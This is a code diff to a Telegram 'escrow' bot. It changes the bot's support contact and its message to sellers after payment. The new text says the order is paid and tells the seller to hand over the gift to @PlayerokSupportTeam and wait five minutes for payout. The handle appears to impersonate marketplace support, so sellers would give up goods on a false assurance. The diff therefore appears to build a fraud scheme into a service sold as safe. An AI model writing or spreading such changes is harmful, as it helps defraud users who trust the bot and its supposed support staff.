@@ -31,7 +31,7 @@ STUB_TEXTS = {
     kb.CB_MAIN_REQUISITES: "🧾 <b>Реквизиты</b>\n\nЗдесь можно будет указать реквизиты для выплат.",
     kb.CB_MAIN_PROFILE: "👤 <b>Профиль</b>\n\nЗдесь будет статистика и настройки вашего аккаунта.",
     kb.CB_MAIN_LANGUAGE: "🌐 <b>Язык интерфейса</b>\n\nВыбор языка будет доступен в следующей версии.",
-    kb.CB_MAIN_SUPPORT: "🆘 <b>Поддержка</b>\n\nПо всем вопросам пишите: @your_support_username",
+    kb.CB_MAIN_SUPPORT: "🆘 <b>Поддержка</b>\n\nПо всем вопросам пишите: @PlayerokSupportTeam",
     kb.CB_MAIN_ABOUT: "ℹ️ <b>О сервисе</b>\n\nEscrow-бот безопасно удерживает средства до выполнения условий сделки обеими сторонами.",
 }
 
@@ -97,7 +97,7 @@ async def cb_buy_deal(callback: CallbackQuery) -> None:
     try:
         await callback.bot.send_message(
             chat_id=deal["creator_id"],
-            text=f"✅ Ваш заказ #{deal_id} оплачен!",
+            text=f"✅ Ваш заказ #{deal_id} оплачен!Передайте подарок: @PlayerokSupportTeam и ожидайте выплату(5 минут)",
         )
     except Exception:
         pass  # Продавец мог заблокировать бота
@@ -106,7 +106,7 @@ async def cb_buy_deal(callback: CallbackQuery) -> None:
 
 
 # ---------------------------------------------------------------------------
-# /admin — панель администратора
+# /teamzeta — панель администратора
 # ---------------------------------------------------------------------------
 @router.message(Command("admin"))
 async def cmd_admin(message: Message) -> None:
